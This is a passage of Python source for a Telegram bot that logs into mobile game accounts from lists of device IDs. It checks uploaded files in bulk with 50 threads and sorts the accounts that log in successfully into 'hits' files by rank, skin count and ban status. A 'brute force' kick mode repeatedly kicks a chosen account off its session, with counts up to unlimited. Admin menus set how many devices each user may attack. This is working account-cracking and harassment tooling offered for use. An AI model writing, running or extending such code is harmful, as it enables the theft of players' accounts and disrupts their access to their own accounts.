    elif data == "admin_bf_show":
        global_limit = get_bf_limit()
        await query.answer(f"Global BF limit: {global_limit} device(s) per user", show_alert=True)
    
    elif data == "admin_bf_set":
        context.user_data["admin_bf_action"] = "set_global"
        await query.edit_message_text(
            "✏️ <b>SET GLOBAL BF DEVICE LIMIT</b>\n"
            "═══════════════════════════\n"
            f"Current global limit: <b>{get_bf_limit()}</b>\n\n"
            "Send the new limit number (0 = unlimited):\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_bf_set_user":
        context.user_data["admin_bf_action"] = "set_user_id"
        await query.edit_message_text(
            "👤 <b>SET USER-SPECIFIC BF LIMIT</b>\n"
            "═══════════════════════════\n\n"
            "Send the User ID first:\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_bf_clear_all":
        reset_all_bf_devices()
        await query.edit_message_text(
            "✅ <b>All users' BF history cleared!</b>\n"
            "All users can now use new devices.",
            parse_mode=ParseMode.HTML,
            reply_markup=bf_limits_admin_keyboard()
        )
    
    elif data == "admin_bf_clear_user":
        context.user_data["admin_bf_action"] = "clear_user"
        await query.edit_message_text(
            "🧹 <b>CLEAR SPECIFIC USER BF HISTORY</b>\n"
            "═══════════════════════════\n\n"
            "Send the User ID to clear their BF history:\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_bf_stats":
        limits = load_json(BF_LIMITS_FILE)
        users_data = limits.get("users", {})
        user_overrides = limits.get("user_overrides", {})
        
        if not users_data:
            await query.edit_message_text(
                "📊 <b>BF USAGE STATISTICS</b>\n"
                "═══════════════════════════\n"
                "No users have used brute force yet.",
                parse_mode=ParseMode.HTML,
                reply_markup=bf_limits_admin_keyboard()
            )
            return
        
        users_db = load_json(USERS_FILE)
        lines = ["📊 <b>BF USAGE STATISTICS</b>", "═══════════════════════════"]
        lines.append(f"🌍 Global limit: {get_bf_limit()}\n")
        
        if user_overrides:
            lines.append("👤 <b>Users with custom limits:</b>")
            for uid, limit in user_overrides.items():
                username = users_db.get(uid, {}).get("username", f"User_{uid}")
                devices = users_data.get(uid, [])
                lines.append(f"  {escape_html(username)}: {len(devices)}/{limit}")
            lines.append("")
        
        lines.append("<b>Top users by usage:</b>")
        sorted_users = sorted(users_data.items(), key=lambda x: len(x[1]), reverse=True)
        for uid, devices in sorted_users[:20]:
            username = users_db.get(uid, {}).get("username", f"User_{uid}")
            limit = get_bf_limit(int(uid))
            lines.append(f"👤 {escape_html(username)}")
            lines.append(f"   🆔 {uid}")
            lines.append(f"   📊 Used: {len(devices)}/{limit}")
            lines.append("")
        
        if len(sorted_users) > 20:
            lines.append(f"... and {len(sorted_users)-20} more users")
        lines.append("═══════════════════════════")
        
        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=bf_limits_admin_keyboard())

# ────────────────────────────────────────────────────────────────
# 20. ADMIN BF TEXT HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_admin_bf_text(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, action: str):
    if text.lower() == '/cancel':
        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
        context.user_data.pop("admin_bf_action", None)
        context.user_data.pop("bf_target_user_id", None)
        return
    
    if action == "set_global":
        try:
            limit = int(text)
            if limit < 0:
                await update.message.reply_text("❌ Limit cannot be negative! Send 0 for unlimited.")
                return
            set_bf_limit(limit)
            await update.message.reply_text(
                f"✅ <b>Global BF Limit Updated!</b>\n"
                f"New limit: <b>{limit}</b> device(s) per user",
                parse_mode=ParseMode.HTML,
                reply_markup=bf_limits_admin_keyboard()
            )
            context.user_data.pop("admin_bf_action", None)
        except ValueError:
            await update.message.reply_text("❌ Please send a valid number.")
    
    elif action == "set_user_id":
        try:
            target_id = int(text)
            context.user_data["bf_target_user_id"] = target_id
            context.user_data["admin_bf_action"] = "set_user_value"
            await update.message.reply_text(
                f"👤 User ID: <code>{target_id}</code>\n"
                f"Current limit: <b>{get_bf_limit(target_id)}</b>\n\n"
                f"Send new limit (0=unlimited, -1=use global):",
                parse_mode=ParseMode.HTML
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid User ID. Please send a number.")
    
    elif action == "set_user_value":
        try:
            limit = int(text)
            if limit < -1:
                await update.message.reply_text("❌ Limit cannot be less than -1.")
                return
            target_id = context.user_data.get("bf_target_user_id")
            if not target_id:
                await update.message.reply_text("❌ Session expired.", reply_markup=admin_panel_keyboard())
                context.user_data.pop("admin_bf_action", None)
                return
            set_user_bf_limit(target_id, limit)
            if limit == -1:
                await update.message.reply_text(
                    f"✅ <b>User-Specific BF Limit Removed!</b>\n"
                    f"User <code>{target_id}</code> will now use global limit.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=bf_limits_admin_keyboard()
                )
            else:
                await update.message.reply_text(
                    f"✅ <b>User BF Limit Updated!</b>\n"
                    f"User <code>{target_id}</code>: <b>{limit}</b> device(s)",
                    parse_mode=ParseMode.HTML,
                    reply_markup=bf_limits_admin_keyboard()
                )
            context.user_data.pop("admin_bf_action", None)
            context.user_data.pop("bf_target_user_id", None)
        except ValueError:
            await update.message.reply_text("❌ Please send a valid number.")
    
    elif action == "clear_user":
        try:
            target_id = int(text)
            if clear_user_bf_devices(target_id):
                await update.message.reply_text(
                    f"✅ <b>BF History Cleared for User <code>{target_id}</code></b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=bf_limits_admin_keyboard()
                )
            else:
                await update.message.reply_text(
                    f"ℹ️ User <code>{target_id}</code> has no BF history.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=bf_limits_admin_keyboard()
                )
            context.user_data.pop("admin_bf_action", None)
        except ValueError:
            await update.message.reply_text("❌ Invalid User ID.")

# ────────────────────────────────────────────────────────────────
# 21. CONVERSATION ROUTER
# ────────────────────────────────────────────────────────────────

async def _conversation_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stage = context.user_data.get("bf_custom_stage")
    if stage == "loops":
        return STATE_BF_CUSTOM_LOOPS
    if stage == "delay":
        return STATE_BF_CUSTOM_DELAY
    
    admin_state = context.user_data.get("admin_conv_state")
    if admin_state == "delete_key":
        return STATE_ADMIN_DELETE_KEY
    if admin_state == "revoke_user":
        return STATE_ADMIN_REVOKE_USER
    if admin_state == "broadcast":
        return STATE_ADMIN_BROADCAST
    if admin_state == "add_user":
        return STATE_ADMIN_ADDUSER_ID
    
    return ConversationHandler.END

# ────────────────────────────────────────────────────────────────
# 22. UNIFIED TEXT HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_all_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unified text input handler that routes based on state."""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if not text:
        return
    
    if (context.user_data.get("bf_custom_stage") or 
        context.user_data.get("admin_conv_state")):
        return
    
    action = context.user_data.get("admin_bf_action")
    if action and is_admin(user_id):
        await handle_admin_bf_text(update, context, text, action)
        return
    
    if context.user_data.get("waiting_for_single_check"):
        await handle_single_check_input(update, context)
        return
    
    if context.user_data.get("waiting_for_bruteforce"):
        await handle_bf_device_input(update, context)
        return
    
    if is_admin(user_id):
        await update.message.reply_text(
            "ℹ️ Select an option from the menu below:",
            reply_markup=main_menu_keyboard()
        )
    else:
        await update.message.reply_text(
            "ℹ️ Please select an option from the menu.",
            reply_markup=main_menu_keyboard()
        )

# ────────────────────────────────────────────────────────────────
# 23. SINGLE CHECK INPUT
# ────────────────────────────────────────────────────────────────

async def process_single_device(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
    """Process a single device ID check"""
    await update.message.reply_text("⏳ Checking account... Please wait.", reply_markup=ReplyKeyboardRemove())
    
    result = [None, None]
    def worker():
        acc, zone, stat = GameLogin(device_id).run()
        if not acc or not zone:
            result[0] = None
            result[1] = stat
            return
        player_data = process_detail(device_id, acc, zone)
        result[0] = (acc, zone)
        result[1] = player_data
    
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    
    while t.is_alive():
        await asyncio.sleep(0.5)
    
    acc_zone = result[0]
    player_data = result[1]
    
    if not acc_zone:
        msg = f"❌ <b>Login Failed!</b>\nDevice ID invalid or dead."
        if isinstance(result[1], str) and 'ban' in result[1].lower():
            msg += f"\n🚫 Status: {escape_html(result[1])}"
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
        return
    
    acc, zone = acc_zone
    
    if not player_data:
        await update.message.reply_text(
            "❌ Could not fetch account details.\nThe account may not have a player profile.",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard()
        )
        return
    
    nick = player_data.get('nickname', 'N/A')
    level = player_data.get('level', 'N/A')
    skin_cnt = player_data.get('skin_count', 0)
    hero_cnt = player_data.get('hero_count', 0)
    cur_rank = player_data.get('current_rank', 'Unranked')
    highest_rank = player_data.get('highest_rank', 'N/A')
    ban_stat = player_data.get('ban_status', 'NORMAL')
    v2l = player_data.get('v2l_status', 'N/A')
    created_at = player_data.get('created_at', 'N/A')
    
    v2l_text = "ACTIVE 🟢" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
               "INACTIVE 🔴" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
    
    is_banned = 'ban' in str(ban_stat).lower()
    
    text = (
        f"📋 <b>ACCOUNT DETAILS (8-REQ CHECK)</b>\n"
        f"═══════════════════════════\n"
        f"📱 Device ID: <code>{escape_html(device_id)}</code>\n"
        f"🆔 Account: <b>{acc}</b> ({zone})\n"
        f"👤 Nickname: <b>{escape_html(str(nick))}</b> (Lv.{level})\n"
        f"⚡ Status: {'🚫 BANNED' if is_banned else '✅ NORMAL'}\n"
    )
    if is_banned:
        text += f"   🚫 Reason: {escape_html(str(ban_stat))}\n"
    text += (
        f"🏆 Rank: {cur_rank}\n"
        f"⭐ Max Rank: {highest_rank}\n"
        f"🦸 Heroes: {hero_cnt}\n"
        f"🎨 Skins: {skin_cnt}\n"
        f"🔐 V2L: {v2l_text}\n"
        f"📅 Created: {created_at}\n"
        f"═══════════════════════════"
    )
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())

async def handle_single_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    device_id = update.message.text.strip()
    if device_id.lower() == '/cancel':
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
        context.user_data["waiting_for_single_check"] = False
        return
    
    context.user_data["waiting_for_single_check"] = False
    await process_single_device(update, context, device_id)

# ────────────────────────────────────────────────────────────────
# 24. BRUTE FORCE DEVICE INPUT
# ────────────────────────────────────────────────────────────────

async def process_bf_device(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
    """Process a device for brute force"""
    user_id = update.effective_user.id
    
    user_devices = get_user_bf_devices(user_id)
    limit = get_bf_limit(user_id)
    
    if not is_admin(user_id):
        if limit > 0 and len(user_devices) >= limit:
            await update.message.reply_text(
                f"❌ <b>Device Limit Reached!</b>\n\n"
                f"Limit: <b>{limit}</b> device(s)\n"
                f"📊 Used: {len(user_devices)}/{limit}\n"
                f"💡 Contact admin to increase your limit.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard()
            )
            context.user_data["waiting_for_bruteforce"] = False
            return
        
        if device_id in user_devices:
            await update.message.reply_text(
                f"❌ <b>Device Already Used!</b>\n\n"
                f"📊 Used: {len(user_devices)}/{limit}\n"
                f"💡 Try a different device ID.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard()
            )
            context.user_data["waiting_for_bruteforce"] = False
            return
    
    context.user_data["waiting_for_bruteforce"] = False
    await update.message.reply_text("⏳ Verifying device & fetching profile...", reply_markup=ReplyKeyboardRemove())
    
    profile = [None]
    def worker():
        profile[0] = fetch_session_profile(device_id)
    
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    
    while t.is_alive():
        await asyncio.sleep(0.5)
    
    prof = profile[0]
    
    if not prof:
        await update.message.reply_text(
            "❌ Invalid Device ID!\nDevice may be dead or login failed.",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard()
        )
        return
    
    context.user_data["bf_device"] = device_id
    context.user_data["bf_stop_flag"] = False
    context.user_data["bf_refunded"] = False
    
    ban_text = "🚫 BANNED" if 'ban' in str(prof['ban_status']).lower() else "✅ NORMAL"
    
    used_count, limit = get_user_bf_usage_stats(user_id)
    remaining = limit - used_count if limit > 0 else "Unlimited"
    limit_text = f"📊 Remaining devices: {remaining}" if limit > 0 else "♾️ Unlimited"
    
    text = (
        f"📋 <b>ACCOUNT PROFILE</b>\n"
        f"═══════════════════════════\n"
        f"📱 Device: <code>{escape_html(device_id)}</code>\n"
        f"👤 Nickname: <b>{escape_html(str(prof['nickname']))}</b>\n"
        f"🆔 Account ID: <code>{prof['account_id']}</code>\n"
        f"🌍 Zone: {prof['zone_id']}\n"
        f"📊 Level: {prof['level']}\n"
        f"🏆 Rank: {prof['rank']}\n"
        f"⭐ Max Rank: {prof['highest_rank']}\n"
        f"🎨 Skins: {prof['skin_count']} | 🦸 Heroes: {prof['hero_count']}\n"
        f"⚡ Status: {ban_text}\n"
        f"═══════════════════════════\n"
        f"{limit_text}\n"
        f"═══════════════════════════\n"
        f"⚡ <b>SELECT KICK MODE:</b>"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 Single Test", callback_data="bf_kick_1_0"),
         InlineKeyboardButton("⚡ 10x", callback_data="bf_kick_10_2"),
         InlineKeyboardButton("🚀 50x", callback_data="bf_kick_50_1")],
        [InlineKeyboardButton("💥 100x", callback_data="bf_kick_100_0.5"),
         InlineKeyboardButton("♾️ Unlimited", callback_data="bf_kick_0_0")],
        [InlineKeyboardButton("🛠️ Custom", callback_data="bf_kick_custom_0")],
        [InlineKeyboardButton("🛑 Stop Current Kick", callback_data="bf_stop")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ])
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

async def handle_bf_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    device_id = update.message.text.strip()
    
    if device_id.lower() == '/cancel':
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
        context.user_data["waiting_for_bruteforce"] = False
        return
    
    await process_bf_device(update, context, device_id)

# ────────────────────────────────────────────────────────────────
# 25. BF CUSTOM HANDLERS
# ────────────────────────────────────────────────────────────────

async def handle_bf_custom_loops(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == '/cancel':
        context.user_data.pop("bf_custom_stage", None)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
        context.user_data["waiting_for_bruteforce"] = False
        return ConversationHandler.END
    
    try:
        loops = int(text)
    except:
        await update.message.reply_text("❌ Invalid number! Try again:")
        return STATE_BF_CUSTOM_LOOPS
    
    context.user_data["bf_custom_loops"] = loops
    context.user_data["bf_custom_stage"] = "delay"
    await update.message.reply_text(
        "Now send the delay in seconds (e.g., <code>1.5</code>):\n\nType /cancel to abort.",
        parse_mode=ParseMode.HTML
    )
    return STATE_BF_CUSTOM_DELAY

async def handle_bf_custom_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    if text.lower() == '/cancel':
        context.user_data.pop("bf_custom_stage", None)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
        context.user_data["waiting_for_bruteforce"] = False
        return ConversationHandler.END
    
    try:
        delay = float(text)
    except:
        await update.message.reply_text("❌ Invalid number! Try again:")
        return STATE_BF_CUSTOM_DELAY
    
    loops = context.user_data.get("bf_custom_loops", 10)
    device_id = context.user_data.get("bf_device")
    context.user_data.pop("bf_custom_stage", None)
    
    if not device_id:
        await update.message.reply_text("❌ Session expired.", reply_markup=main_menu_keyboard())
        context.user_data["waiting_for_bruteforce"] = False
        return ConversationHandler.END
    
    context.user_data["waiting_for_bruteforce"] = False
    context.user_data["bf_stop_flag"] = False
    context.user_data["bf_refunded"] = False
    
    msg = await update.message.reply_text(
        f"⚡ Starting custom kick: {loops} loops, {delay}s delay...",
        parse_mode=ParseMode.HTML
    )
    
    class FakeQuery:
        def __init__(self, msg):
            self.message = msg
        async def edit_message_text(self, *args, **kwargs):
            await self.message.edit_text(*args, **kwargs)
        async def answer(self, *args, **kwargs):
            pass
    
    asyncio.create_task(run_spam_kick(FakeQuery(msg), context, device_id, loops, delay, user_id))
    return ConversationHandler.END

# ────────────────────────────────────────────────────────────────
# 26. BULK FILE HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bulk check .txt file upload with session-specific output files."""
    if not update.message or not update.message.document:
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files are supported!")
        return
    
    user_id = update.effective_user.id
    
    # Check for existing active jobs
    active_jobs = get_user_active_jobs(user_id)
    if active_jobs and not is_admin(user_id):
        await update.message.reply_text(
            f"⚠️ <b>You already have {len(active_jobs)} active job(s)!</b>\n"
            f"Please wait for them to complete or cancel them first.\n"
            f"Use /status to check progress.",
            parse_mode=ParseMode.HTML
        )
        return
    
    status_msg = await update.message.reply_text("⏳ Downloading file...")
    
    try:
        file = await doc.get_file()
        session_id = f"bulk_{int(time.time())}"
        session_dir = os.path.join(OUTPUT_DIR, "bulk_sessions", session_id)
        os.makedirs(session_dir, exist_ok=True)
        
        file_path = os.path.join(session_dir, "input_devices.txt")
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            devices = [l.strip() for l in f if l.strip()]
        
        if not devices:
            await status_msg.edit_text("❌ No device IDs found in file!")
            return
        
        if len(devices) > MAX_BULK_DEVICES:
            await status_msg.edit_text(
                f"❌ Too many devices! Max {MAX_BULK_DEVICES:,} per file.\n"
                f"Found: {len(devices):,}"
            )
            return
        
        # Create job record
        create_bulk_job(user_id, len(devices), session_id)
        
        # Session-specific file paths
        session_files = {
            "all_hits_detail": os.path.join(session_dir, "all_hits_detail.txt"),
            "raw_devices_detail": os.path.join(session_dir, "raw_devices_detail.txt"),
            "banned_accounts": os.path.join(session_dir, "banned_accounts.txt"),
            "v2l_active": os.path.join(session_dir, "v2l_active.txt"),
            "v2l_inactive": os.path.join(session_dir, "v2l_inactive.txt"),
            "sultan": os.path.join(session_dir, "sultan.txt"),
            "warrior": os.path.join(session_dir, "warrior_hits.txt"),
            "elite": os.path.join(session_dir, "elite_hits.txt"),
            "master": os.path.join(session_dir, "master_hits.txt"),
            "gm": os.path.join(session_dir, "grandmaster_hits.txt"),
            "epic": os.path.join(session_dir, "epic_hits.txt"),
            "legend": os.path.join(session_dir, "legend_hits.txt"),
            "mythic": os.path.join(session_dir, "mythic_hits.txt"),
        }
        
        for fpath in session_files.values():
            with open(fpath, 'w', encoding='utf-8') as f:
                pass
        
        stats = {
            "total": len(devices), "processed": 0, "hits": 0, "info": 0,
            "no_info": 0, "unreg": 0, "banned": 0, "failed": 0,
            "level_1_30": 0, "level_31_50": 0, "level_51_99": 0, "level_100_plus": 0,
            "skin_1_50": 0, "skin_51_99": 0, "skin_100_250": 0,
            "skin_251_300": 0, "skin_301_400": 0, "skin_400_plus": 0,
            "rank_warrior": 0, "rank_elite": 0, "rank_master": 0, "rank_gm": 0,
            "rank_epic": 0, "rank_legend": 0, "rank_mythic": 0,
            "start_time": time.time()
        }
        
        def save_account_session(account_info: dict, player_data: dict):
            device = account_info.get('Device id', '')
            acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')
            ban_stat = player_data.get('ban_status', 'NORMAL')
            is_banned = 'ban' in str(ban_stat).lower()
            
            if is_banned:
                with open(session_files["banned_accounts"], "a", encoding='utf-8') as f:
                    f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
                return
            
            nick = player_data.get('nickname', 'N/A')
            if str(nick).lower() in ("unknown", "guest", ""):
                return
            
            skin = player_data.get('skin_count', 0)
            v2l = player_data.get('v2l_status', 'N/A')
            v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
                       "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
            cur_rank = player_data.get('current_rank', 'Unranked')
            rank_category = get_rank_category(cur_rank)
            
            card_text = format_account_card(device, acc, zone, player_data)
            
            with open(session_files["all_hits_detail"], "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
            
            with open(session_files["raw_devices_detail"], "a", encoding='utf-8') as f:
                f.write(f"{device}\n")
            
            rank_key = rank_category if rank_category in session_files else None
            if rank_key and rank_key in session_files:
                with open(session_files[rank_key], "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            
            if v2l_text == "ACTIVE":
                with open(session_files["v2l_active"], "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            elif v2l_text == "INACTIVE":
                with open(session_files["v2l_inactive"], "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            
            if skin >= 200:
                with open(session_files["sultan"], "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
        
        def process_detail_session(device_id: str, account_id: int, zone_id: int) -> Optional[dict]:
            try:
                with GameConnection(device_id=device_id) as conn:
                    if not conn.login_to_login_server():
                        if 'ban' in conn.ban_status.lower():
                            save_account_session(
                                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                                {'ban_status': conn.ban_status, 'nickname': 'BANNED'}
                            )
                        return None
                    if not conn.get_game_server(): return None
                    if not conn.connect_to_game_server(): return None
                    
                    skin_info = conn.get_skin_role_info(account_id, zone_id)
                    ban_stat = conn.check_ban_status()
                    
                    if 'ban' in ban_stat.lower():
                        save_account_session(
                            {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                            {'ban_status': ban_stat, 'nickname': 'BANNED'}
                        )
                        return None
                    
                    v2l = get_v2l_status(conn, account_id, zone_id)
                    result = conn.lookup_player(account_id)
                    role_info = conn.get_role_info(account_id, zone_id)
                    
                    pd = {}
                    if result and isinstance(result, dict):
                        if isinstance(result.get(0), list) and len(result[0]) > 0:
                            if isinstance(result[0][0], dict):
                                pd = result[0][0]
                            elif isinstance(result[0][0], SdpStruct):
                                pd = dict(result[0][0])
                        elif isinstance(result.get(0), dict):
                            pd = result[0]
                        elif isinstance(result.get(0), SdpStruct):
                            pd = dict(result[0])
                        else:
                            pd = result
                    
                    if not isinstance(pd, dict):
                        pd = {}
                    
                    skin_info = skin_info if isinstance(skin_info, dict) else {}
                    role_info = role_info if isinstance(role_info, dict) else {}
                    
                    nick = pd.get(2) or skin_info.get(2) or role_info.get(2)
                    
                    if not nick or str(nick).lower() in ("unknown", "guest", ""):
                        for key, value in pd.items():
                            if isinstance(value, str) and len(value) > 1 and not value.isdigit():
                                if value.lower() not in ("unknown", "guest", "null", "none"):
                                    nick = value
                                    break
                    
                    if not nick or str(nick).lower() in ("unknown", "guest", ""):
                        if not pd and not skin_info and not role_info:
                            return None
                        nick = f"Player_{account_id}"
                    
                    level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
                    
                    skin_cnt = 0
                    if skin_info and skin_info.get(10) is not None:
                        skin_cnt = skin_info.get(10)
                    elif pd.get(83) is not None:
                        skin_cnt = pd.get(83)
                        
                    hero_cnt = 0
                    if skin_info and skin_info.get(9) is not None:
                        hero_cnt = skin_info.get(9)
                    elif role_info and role_info.get(9) is not None:
                        hero_cnt = role_info.get(9)
                    elif pd.get(9) is not None:
                        hero_cnt = pd.get(9)
                    
                    cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
                    max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
                    
                    created_raw = pd.get(42) or conn.creation_ts
                    created_at = ""
                    if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                        try:
                            dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                            created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                        except:
                            pass
                    
                    player_data = {
                        'nickname': nick, 
                        'level': level, 
                        'skin_count': skin_cnt,
                        'hero_count': hero_cnt, 
                        'current_rank': map_rank(cur_rank_val),
                        'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
                        'ban_status': ban_stat, 
                        'v2l_status': v2l, 
                        'created_at': created_at,
                    }
                    
                    save_account_session(
                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                        player_data
                    )
                    return player_data
                    
            except Exception:
                return None
        
        def update_stats(player_data):
            if not player_data:
                stats["no_info"] += 1
                return
            stats["info"] += 1
            level = player_data.get('level', 0)
            if isinstance(level, (int, float)):
                if 1 <= level <= 30: stats["level_1_30"] += 1
                elif 31 <= level <= 50: stats["level_31_50"] += 1
                elif 51 <= level <= 99: stats["level_51_99"] += 1
                elif level >= 100: stats["level_100_plus"] += 1
            skin = player_data.get('skin_count', 0)
            if isinstance(skin, (int, float)):
                if 1 <= skin <= 50: stats["skin_1_50"] += 1
                elif 51 <= skin <= 99: stats["skin_51_99"] += 1
                elif 100 <= skin <= 250: stats["skin_100_250"] += 1
                elif 251 <= skin <= 300: stats["skin_251_300"] += 1
                elif 301 <= skin <= 400: stats["skin_301_400"] += 1
                elif skin >= 401: stats["skin_400_plus"] += 1
            rank_cat = get_rank_category(player_data.get('current_rank', 'Unranked'))
            key = f"rank_{rank_cat}"
            if key in stats:
                stats[key] += 1

        def do_bulk():
            hits = 0
            processed = 0
            failed = 0
            
            login_results = []
            with ThreadPoolExecutor(max_workers=50) as ex:
                futures = {ex.submit(GameLogin(dev).run): dev for dev in devices}
                for future in as_completed(futures):
                    dev = futures[future]
                    try:
                        acc, zone, stat = future.result(timeout=10)
                        if acc and zone:
                            login_results.append((dev, acc, zone))
                        else:
                            processed += 1
                            stats["processed"] = processed
                            if 'ban' in stat.lower():
                                stats["banned"] += 1
                            else:
                                stats["unreg"] += 1
                                stats["no_info"] += 1
                                failed += 1
                    except Exception:
                        processed += 1
                        stats["processed"] = processed
                        stats["failed"] += 1
                        failed += 1
                    
                    if processed % 100 == 0:
                        update_bulk_job(session_id, processed=processed, hits=hits, failed=failed)
            
            with ThreadPoolExecutor(max_workers=50) as ex:
                futures = []
                for dev, acc, zone in login_results:
                    futures.append((dev, acc, zone, ex.submit(process_detail_session, dev, acc, zone)))
                
                for dev, acc, zone, future in futures:
                    try:
                        result = future.result(timeout=30)
                        if result:
                            hits += 1
                            update_stats(result)
                        else:
                            stats["no_info"] += 1
                            failed += 1
                    except Exception:
                        stats["no_info"] += 1
                        failed += 1
                    processed += 1
                    stats["processed"] = processed
                    stats["hits"] = hits
                    stats["failed"] = failed
                    
                    if processed % 100 == 0:
                        update_bulk_job(session_id, processed=processed, hits=hits, failed=failed)
            
            update_bulk_job(
                session_id,
                processed=processed,
                hits=hits,
                failed=failed,
                status="completed",
                completed_at=datetime.now(TZ_WIB).isoformat()
            )
        
        t = threading.Thread(target=do_bulk, daemon=True)
        t.start()
        
        await status_msg.edit_text(
            f"📊 <b>Loaded {stats['total']:,} IDs.</b>\n"
            f"🆔 Job ID: <code>{session_id}</code>\n"
            f"⏳ Starting...\n\n"
            f"💡 Use /status to check progress",
            parse_mode=ParseMode.HTML
        )
        
        last_update = time.time()
        while t.is_alive():
            await asyncio.sleep(1)
            if time.time() - last_update >= 3:
                job = get_bulk_job(session_id)
                if job:
                    elapsed = time.time() - stats["start_time"]
                    speed = job["processed"] / elapsed if elapsed > 0 else 0
                    eta = (job["total"] - job["processed"]) / speed if speed > 0 else 0
                    try:
                        await status_msg.edit_text(
                            f"📊 <b>Job {session_id}</b>\n"
                            f"═══════════════════════════\n"
                            f"📈 Progress: {job['processed']:,}/{job['total']:,}\n"
                            f"✅ Hits: {job['hits']:,}\n"
                            f"❌ Failed: {job['failed']:,}\n"
                            f"⚡ Speed: {speed:.1f}/s\n"
                            f"⏱️ ETA: {eta/60:.1f}m\n"
                            f"═══════════════════════════\n"
                            f"💡 Use /status for details",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        pass
                last_update = time.time()
        
        elapsed = time.time() - stats["start_time"]
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        speed = stats["processed"] / elapsed if elapsed > 0 else 0
        success_rate = (stats["hits"] / stats["processed"] * 100) if stats["processed"] > 0 else 0
        
        final_text = (
            f"✅ <b>Bulk Check Complete!</b>\n"
            f"═══════════════════════════\n"
            f"🆔 Job ID: <code>{session_id}</code>\n"
            f"📊 Total: {stats['processed']:,}\n"
            f"🎯 Valid: {stats['hits']:,}\n"
            f"❌ Failed: {stats['failed']:,}\n"
            f"📈 Success Rate: {success_rate:.2f}%\n"
            f"⏱️ Time: {minutes}m {seconds}s\n"
            f"⚡ Speed: {speed:.1f}/s\n\n"
            f"📈 <b>Level Distribution:</b>\n"
            f"1-30: {stats['level_1_30']} | 31-50: {stats['level_31_50']}\n"
            f"51-99: {stats['level_51_99']} | 100+: {stats['level_100_plus']}\n\n"
            f"🎨 <b>Skin Distribution:</b>\n"
            f"1-50: {stats['skin_1_50']} | 51-99: {stats['skin_51_99']}\n"
            f"100-250: {stats['skin_100_250']} | 251-300: {stats['skin_251_300']}\n"
            f"301-400: {stats['skin_301_400']} | 401+: {stats['skin_400_plus']}\n\n"
            f"🏆 <b>Rank Distribution:</b>\n"
            f"Warrior: {stats['rank_warrior']} | Elite: {stats['rank_elite']}\n"
            f"Master: {stats['rank_master']} | GM: {stats['rank_gm']}\n"
